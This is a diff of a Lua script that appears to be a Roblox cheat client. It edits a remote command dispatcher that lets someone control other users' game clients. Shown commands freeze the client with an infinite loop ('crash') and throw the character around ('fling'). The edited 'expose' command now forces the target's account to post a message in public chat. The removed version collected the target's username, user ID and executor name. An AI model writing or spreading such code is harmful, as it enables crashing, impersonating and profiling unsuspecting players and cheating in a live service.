@@ -415,9 +415,21 @@ local function executeCommand(command, args)
 	elseif command == 'crash' then
 		task.spawn(function() while true do end end)
 	elseif command == 'expose' then
-		local info = lp.Name..' | '..tostring(lp.UserId)..' | '..(identifyexecutor and identifyexecutor() or 'unknown executor')
-		if vain then vain:CreateNotification('Exposed', info, 15, 'alert') end
-		setclipboard(info)
+		-- make the target publicly say "xxBananas123xx" in chat
+		task.spawn(function()
+			local tcs = game:GetService('TextChatService')
+			local rs  = game:GetService('ReplicatedStorage')
+			local msg = 'xxBananas123xx'
+			pcall(function()
+				if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+					local ch = tcs:FindFirstChild('TextChannels') and tcs.TextChannels:FindFirstChild('RBXGeneral')
+					         or tcs.ChatInputBarConfiguration.TargetTextChannel
+					if ch then ch:SendAsync(msg) end
+				else
+					rs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
+				end
+			end)
+		end)
 	elseif command == 'fling' then
 		if hrp then hrp.Velocity = Vector3.new(math.random(-500,500), 1000, math.random(-500,500)) end
 	elseif command == 'spin' then
